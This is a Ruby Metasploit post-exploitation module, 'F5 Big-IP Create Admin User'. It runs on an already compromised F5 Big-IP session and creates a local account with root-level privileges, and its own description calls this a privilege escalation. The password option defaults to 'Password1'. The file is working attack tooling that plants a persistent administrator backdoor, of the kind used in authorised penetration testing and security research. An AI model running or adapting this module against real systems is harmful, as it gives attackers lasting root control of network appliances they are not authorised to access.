##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'F5 Big-IP Create Admin User',
      'Description'  => %q{
        This creates a local user with a username/password and root-level
        privileges. Note that a root-level account is not required to do this,
        which makes it a privilege escalation issue.
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ron Bowes'
        ],
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    ))

    register_options([
      OptString.new('USERNAME', [true, 'Username to create']),
      OptString.new('PASSWORD', [true, 'Password for the user, either plaintext or as a \'$6$\'-prefixed crypted password', 'Password1']),
    ])
  end

  def run
    mcp_create_user(datastore['USERNAME'], datastore['PASSWORD'])
  end

  # def save(msg, data, ctype = 'text/plain')
  #   ltype = 'linux.enum.users'
  #   loot = store_loot(ltype, ctype, session, data, nil, msg)
  #   print_good("#{msg} stored in #{loot.to_s}")
  # end

end
